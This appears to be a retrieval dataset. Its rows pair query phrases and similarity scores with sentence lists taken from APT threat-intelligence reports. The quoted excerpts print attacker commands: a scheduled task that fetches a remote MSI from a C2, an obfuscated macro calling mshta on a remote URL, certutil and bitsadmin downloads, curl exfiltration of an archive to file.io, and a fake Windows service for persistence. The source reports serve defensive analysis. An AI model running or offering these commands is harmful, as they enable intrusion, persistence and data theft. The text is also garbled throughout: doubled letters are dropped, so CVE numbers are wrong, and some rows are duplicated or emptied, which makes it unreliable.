0d1c0b15d71a2e81bf1d3fc93557761d,The computer name and the username is also sent to the C2.,1.0,"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.', 'Biter APT do not apear to change their tactics to much, therefore we can asume that the payloads wil be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keyloger, remote aces tol, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShel comand stage, obfuscating the activity further than just simple string concatenation.']"
75291a1b40c627ac33b55119a494eacd,file stealer,0.7819941275633288,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .', 'Atribution 16 .', 'Conclusion 19 .']"
18fdef6f2cea9e0b1ab1a71f532e578a,file stealer,0.7819941275633288,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .', 'Atribution 16 .', 'Conclusion 19 .']"
c7c9dc3d3f903b2ce98ced8a8e8576c2,file stealer,1.0,"['We believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations.', 'We ases with low confidence that MoustachedBouncer is closely coperating with Winter Vivern, another group targeting European diplomats but using diferent TPs.', 'Since 2014, the group has ben operating a malware framework that we have named NightClub.', 'It uses the SMTP and IMAP (email) protocols for C&C comunications.', 'Starting in 2020, the group has ben using, in paralel, a second malware framework we have named Disco.', 'Both NightClub and Disco suport aditional spying plugins including a screnshoter, an audio recorder, and a file stealer.', 'Victimology Acording to ESET telemetry, the group targets foreign embasies in Belarus, and we have identified four diferent countries whose embasy staf have ben targeted: two from Europe, one from South Asia, and one from Africa.', 'The key dates are shown in Figure 1.', '1/20 Figure 1.', 'Timeline of MoustachedBouncer activities Atribution While we track MoustachedBouncer as a separate group, we have found elements that make us ases with low confidence that they are closely colaborating with another group known as Winter Vivern.', 'The later was discovered in 2021 and is stil active as of 2023.']"
8be76b8e09117447731108cd5189e509,file stealer,1.0,"['It is important to note that the plugins dont have unique internal identification numbers; therefore we are identifying them here by their DL names on disk, which we have never sen change.', 'Table 2.', 'List of plugin DL files Plugin DL name Overview Keyloger.', 'Kstrcs.dl It only actively logs keystrokes when the foreground window belongs to a proces named Q.exe and the window title matches QEdit.', ""It's likely target is the Tencent Q chat aplication."", 'File stealer.', 'Has a configuration file that enables the colection of files from diferent sources: HDs, sebasek.dl USB thumb drives, and CD-ROMs; as wel as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be betwen a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dl key.', 'pRsm.dl Captures input and output audio streams.', 'Credential stealer.', 'mailLFPasword.dl Steals credentials from Outlok and Foxmail email client software.']"
c0dca056b757e270a63caed5fb0f0fba,Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.,0.7872211662449353,"['Implement YARA rules like the ones found in Recorded Future Hunting Packages to identify malware via signature-based detection or SNORT rules for endpoint-based detections.', 'The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP trafic asociated with ransomware.', 'Network segmentation can halt the propagation of ransomware through an organizations network.', 'This solution involves spliting the larger network into smaler network segments and can be acomplished through firewals, virtual local area networks, and other separation techniques.', 'If remote aces solutions are crucial to daily operations, al remote aces services and protocols, such as Citrix and RDP, should be implemented with two-factor or multi-factor authentication.', 'Exposed Remote Desktop Protocol (RDP) servers are also abused by threat actors to gain initial aces into a targets network.', 'Threat actors wil lok for networks that have internet-facing servers runing RDP and then exploit vulnerabilities in those servers or use brute-force pasword atacks.', 'Once inside the network, the threat actors move lateraly and instal ransomware on target machines, often disabling backups and other protections.', '7 CTA-202-0802 Recorded Future | w.recordedfuture.com CYBER THREAT ANALYSIS Outlok Infostealer malware and exfiltrated logs wil remain popular among threat actors as a means to obtain credentials to gain aces to victim networks.', 'While some infostealer variants, such as RedLine, FickerStealer, and AZORult have endured, new variants like Mars Stealer, MetaStealer, and Eternity wil continue to emerge.', 'Dark web shops and marketplaces wil also remain an atractive source of infostealer logs for threat actors.']"
009dda7551ff6a1a7bf199dfb068fea0,The threat actor also engaged in brute-forcing against the victim's internal web services,1.0,"['The comand-and-control infrastructure was publicly exposed to the internet.', 'Based on log and meta data found on the server, EclecticIQ analysts ases with high confidence the threat actor performed ofensive cyber operations, including reconaisance, malware delivery, and post-exploitation against selected targets.', 'EclecticIQ analysts identified a modified version of Cobalt Strike known as ""Cobalt Strike Cat""[1].', ""Researchers analyzed these logs and created a detailed map of the adversary's tactics, techniques, and procedures (TPs)."", 'The threat actor primarily focused on exploiting four diferent remote code execution (RCE) vulnerabilities to target web services and heavily relied on open-source tols, some of which are exclusively available in Chinese underground forums.', ""The threat actor also engaged in brute-forcing against the victim's internal web services."", '1/19 Exposed Threat Actor Infrastructure Reveals Ofensive Toling EclecticIQ analysts discovered a web server with the IP adres 156[.]251[.]172[.', ']194, which was acesible to the public.', 'The server contained HTP header data (SimpleHTP/0.6 Python/3.8.10), indicating the use of a Python library caled SIMPLEHTPSERVER to serve the files and folders detailed in Figure 1.', 'Figure 1 Screnshot of exposed threat actor infrastructure showing available tols and target lists.', 'EclecticIQ analysts identified post-exploitation and reconaisance tols on the server.']"
009dda7551ff6a1a7bf199dfb068fea0,List of recently opened files and folders on the computer.,0.7539173212318052,"['net user Displays information about user acounts.', 'Used to search for the string ""DBPath"" in al files within findstr /s /i ""DBPath"" *.', '* the curent directory and its subdirectories.', 'arp a Adres resolutions for remote systems.', 'netsh wlan show profiles Display a list of al the wireles network profiles.', 'dir List of recently opened files and folders on the %APDATA%\\Microsoft\\Windows\\Recent computer.', '9/19 Figure 1 shows some examples of comands executed by the threat actor on an infected host: Figure 1 Executed reconaisance comands on infected host.', 'Escalate Privileges with Stolen Credentials The threat actor uses stolen paswords from valid acounts as the primary vector for privilege escalation.', 'The actor deployed various credential stealing techniques against compromised hosts to obtain user acount paswords in NTLM hash format and saved credentials from web browser.', 'These paswords would alow the threat actor to escalate privileges using valid acounts if the acounts were privileged .', ""The Cobalt Strike Cat beacon logs (Figure 12) show that the actor uploaded LaZagne onto the infected device for credential harvesting purposes and deleted the LaZagne binary after execution to avoid detection from the user's side.""]"
009dda7551ff6a1a7bf199dfb068fea0,the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.,0.7916683264385116,"['1/19 Malicious service instalation is acomplished via the below comand line argument: sc create WindowsUpdate binPath= C:\\Windows\\Temp\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this comand is executed on remote victim device, it wil instal a fake Windows service caled windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\Windows\\Temp\\svchost.exe every time the victim device is started.', 'Figure 14 Instalation of malicious Windows service.', 'Move Lateraly Trough Reverse Proxy The threat actor utilized open-source reverse proxy tols to expose local devices located behind a NAT or firewal, to the Internet.', 'This alowed the atacker to conduct vulnerability scans, general reconaisance, and brute-force atacks on systems atached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\Windows\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tol FRP.', 'FRP received a comand-line argument from atacker used to establish a conection from the adversary-controled infrastructure (156[.]251[.]172[.', ']194) over port 23.', '12/19 Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy conection, the threat actor performed internal reconaisance and brute forcing atempts on some of the internal FTP servers inside victim network.', 'Victimology and Targeting Paterns EclecticIQ researchers ases with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.']"
009dda7551ff6a1a7bf199dfb068fea0,Execution of FRP reverse SOCKS proxy on infected host.,0.8908700218505028,"['This alowed the atacker to conduct vulnerability scans, general reconaisance, and brute-force atacks on systems atached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\Windows\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tol FRP.', 'FRP received a comand-line argument from atacker used to establish a conection from the adversary-controled infrastructure (156[.]251[.]172[.', ']194) over port 23.', '12/19 Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy conection, the threat actor performed internal reconaisance and brute forcing atempts on some of the internal FTP servers inside victim network.', 'Victimology and Targeting Paterns EclecticIQ researchers ases with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.', 'Logs obtained from atacker infrastructure, such as target lists and metadata show that organizations in Taiwan acount for the largest proportion of targets.', 'Acording to event logs, on 02/09 at 08:51:43 UTC, EclecticIQ researchers have concluded with high confidence that the actor compromised an IOT device in the network of the Directorate General of Highways, MOTC in Taiwan [19].', 'After this initial comprise the threat actor performed reconaisance and credential harvesting from infected host, very likely to perform lateral movement as an end goal.']"
009dda7551ff6a1a7bf199dfb068fea0,Threat actor uploaded the fast reverse proxy (FRP) binary,0.7713243506218127,"['Windows services ran with the highest privilege, NT AUTHORITY\\SYSTEM and execute the malware automaticaly during system startup, alowing for remote aces to the victim device with persistence.', '1/19 Malicious service instalation is acomplished via the below comand line argument: sc create WindowsUpdate binPath= C:\\Windows\\Temp\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this comand is executed on remote victim device, it wil instal a fake Windows service caled windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\Windows\\Temp\\svchost.exe every time the victim device is started.', 'Figure 14 Instalation of malicious Windows service.', 'Move Lateraly Trough Reverse Proxy The threat actor utilized open-source reverse proxy tols to expose local devices located behind a NAT or firewal, to the Internet.', 'This alowed the atacker to conduct vulnerability scans, general reconaisance, and brute-force atacks on systems atached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\Windows\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tol FRP.', 'FRP received a comand-line argument from atacker used to establish a conection from the adversary-controled infrastructure (156[.]251[.]172[.', ']194) over port 23.', '12/19 Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy conection, the threat actor performed internal reconaisance and brute forcing atempts on some of the internal FTP servers inside victim network.']"
009dda7551ff6a1a7bf199dfb068fea0,the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:•    CVE-2023-21839      Oracle WebLogic Server RCE [13]•    CVE-2021-3129      Laravel debug mode RCE [14]•    CVE-2020-2551      Oracle WebLogic RCE [15]•    CVE-2021-44228     Apache Log4j [16],0.8044485531978601,"['The threat actor utilized virtual sandboxes named ""Test"" to demonstrate cyber-atacks before executing them on a real victim device.', 'The IP adreses observed in these virtual sandboxes are tied to the same computer name, identified as DESKTOP-0TBCAC4.', 'The adversary also demonstrated an interest in exploring the public-facing network surface of public transport and utilities industries.', 'Figure 4 Completed reconaisance and vulnerability scans.', '4/19 Initial Compromise Through Exploiting Publicly Facing Aplications The threat actor utilized automated vulnerability discovery and reconaisance techniques to scan a given target list, refine the selection and identify potential exploitable systems before comencing the atack.', 'Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four diferent known remote code execution (RCE) vulnerabilities during their operations: CVE-2023-21839 Oracle WebLogic Server RCE [13] CVE-2021-3129 Laravel debug mode RCE [14] CVE-2020-251 Oracle WebLogic RCE [15] CVE-2021-428 Apache Log4j [16] Figure 5 BASH history logs of from the threat actors system showing exploitation of CVE-2020-251.', 'Establish Fothold by Modified Version of Cobalt Strike The threat actor utilized a modified version of Cobalt Strike 4.5, dubed ""Cobalt Strike Cat"", to create a dedicated comunication chanel from the victim system and perform evasive post-exploitation steps.', 'Cobalt Strike Cat was initialy shared on a Chinese-speaking cybersecurity forum caled t0ls[.', ']com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.', 'Only registered users of t0ls[.', ']com could obtain the decryption key for the ZIP folder and aces the tol.']"
009dda7551ff6a1a7bf199dfb068fea0,the victim IP address was publicly serving a web service that contained a phpMyAdmin database.,0.8065225108936074,"['The atacker then changed the Cobalt Strike Cat beaconing frequency for behaviour-based evasion by sending the ""slep 10"" comand to the infected host and executed the ""tasklist /SVC"" comand to list al runing proceses on the victim device.', 'Figure 8 Sample of Cobalt Strike Cat logs.', 'The result of the ""tasklist"" comand shows that the victim was using a comercial software caled SONAS [18].', 'SONAS is an aplication for remote monitoring and control of Internet of Things (IoT) hardware devices.', 'Analysts ases with high confidence that the compromised device was used to aces CTV cameras of the Directorate General of Highways in Taiwan.', 'Analysis showed that the victim IP adres was publicly serving a web service that contained a phpMyAdmin database.', 'The database used a weak pasword and was susceptible to brute-force atacks.', 'Figure 9 shows the redacted victim DNS adres, confirming that the web service was used by the Taiwanese government.', 'The IP adreses and the computer name matched the victim device name in the Cobalt Strike Cat logs.', '7/19 Figure 9 PHPINFO page from victim web service.', 'Internal Reconaisance to Identify Lateral Movement Oportunities EclecticIQ researchers observed multiple internal network reconaisance atempts after initial compromise.']"
7c835116563bd415741d640fd6a04033,the actor introduced a downloader to fetch and spawn the next stage payload,0.8771472748806102,"['1/12 Executive sumary BlueNorof group introduced new file types to evade Mark-of-the-Web (MOTW) security measures; BleuNorof group expanded file types and tweaked infection methods; BlueNorof created numerous fake domains impersonating venture capital companies and banks.', 'Background At the end of September 202, we observed new BlueNorof malware in our telemetry.', 'After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload.', 'The actor tok advantage of several scripts, including Visual Basic Script and Windows Batch script.', 'They also started using disk image file formats, .iso and .vhd, to deliver their malware.', 'For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.', 'Although the initial intrusion methods were very diferent in this campaign, the final payload that we had analyzed previously was used without significant changes.', 'Novel infection chain Long-lasting initial infection Based on our telemetry, we observed that one victim in the UAE was atacked using a malicious Word document.', 'The victim received a document file named Shamjit Client Details Form.doc on September 2, 202.', 'Unfortunately, we couldnt acquire the document, but it was executed from the folowing path: C:\\Users\\[username]\\Desktop\\SALES OPS [redacted]\\[redacted]\\Signed Forms & Income Docs\\Shamjit Client Details Form.doc Judging from the file path, we can asume that the victim was an employe in the sales department responsible for signing contracts.', '2/12 Upon launch, the malicious document conects to the remote server and downloads the payload.']"
0cb31182c70e3c1900fee9f19cd10fb8,"a file downloaded from the internet,",0.7725744527111534,"['In 2019, we exposed Operation Ghost [41], a largescale espionage operation targeting ministries of foreign afairs in Once opened in a browser, the HTML file automaticaly trigers what sems like the download of an Europe.', 'In 2020, the group received a lot of atention for the suplychain ISO disk image file.', 'In order to suced, the intended victim must chose either to save this file and atack pigybacking on SolarWinds, leading to the compromise of major subsequently open it, or to open it directly.', 'If either is chosen, a smal piece of JavaScript decodes the organizations including many parts of the US government.', 'ISO file, which is embeded directly in the HTML atachment.', 'It is not downloaded from the internet.', 'The Dukes: Phishing European diplomats In the previous threat report, ESET researchers highlighted several spearphishing campaigns against European diplomats.', 'These malicious operations were atributed to an infamous cyberespionage group known as the Dukes.', 'In October and November 2021, ESET detected aditional spearphishing campaigns, again targeting European diplomatic misions and Ministries of Foreign Afairs.', 'ESET researchers also atribute these new operations to the Dukes.', 'This is in line with recent open-source reporting such as this report [42] by ANSI (the French National Agency for the Security of Information Systems) released in early December 2021.']"
e15fbf8bdb3a2ebc68fdf55143a7f9b8,fetch the next stage payload.,0.7729420661921118,"['As we can se, the actor uses content the victim could be interested in, such as an event to be held in the near future, a specific request form, and the resume of a high-profile individual.', 'Decoy documents 5/14 Malicious document and method of delivering next stage payload Malicious documents delivered to the victim contain a macro to fetch the next stage payload.', 'The macro has a simple functionality and, interestingly, it spawns several child Windows comand shels, probably intended for evading behavior-based analysis.', 'Eventualy, the macro executes a fetched payload with the mshta.exe proces that is designed to execute a Microsoft HTML Aplication.', 'The folowing scriptlet is part of a malicious macro in the document.', 'It contains a remote server adres to fetch the next stage payload.', 'cmd = ""c"" + ""md /"" + ""c c"" + ""md /"" + ""c cm"" + ""d /"" + ""c c"" + ""m"" + ""d /"" + ""c c"" + ""md /"" + ""c c"" + 1 ""md /"" + ""c msht"" + ""a.e"" + ""xe hxp:/lehr24.mywebcomunity[.', ']org/h.php"" 2 Shel cmd, 0 3 Slep 90 4 cmd = ""cm"" + ""d /"" + ""c TAS"" + ""KI"" + ""L /"" + ""F /"" + ""IM msh"" + ""ta.e"" + ""xe"" 5 Shel cmd, 0 Luckily, we discovered the coresponding C2 script (h.php) from our telemetry.', 'This script saves incoming trafic information to the log.txt file including the date, IP adres, user-agent and the right-most 20 characters of the IP MD5 hash which is internaly caled TID (probably short for Target ID).', 'Next, it checks the presence of the alow.txt file that contains IP adreses of verified victims.', 'Only if the clients IP adres exists in the alow.txt, is the next stage payload, h.txt, delivered.']"
920bbf3f4cf30cf9c556531074485448,cmd.exe /c,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe /c,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe /c,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe /c,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe /c,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /c,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /c,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
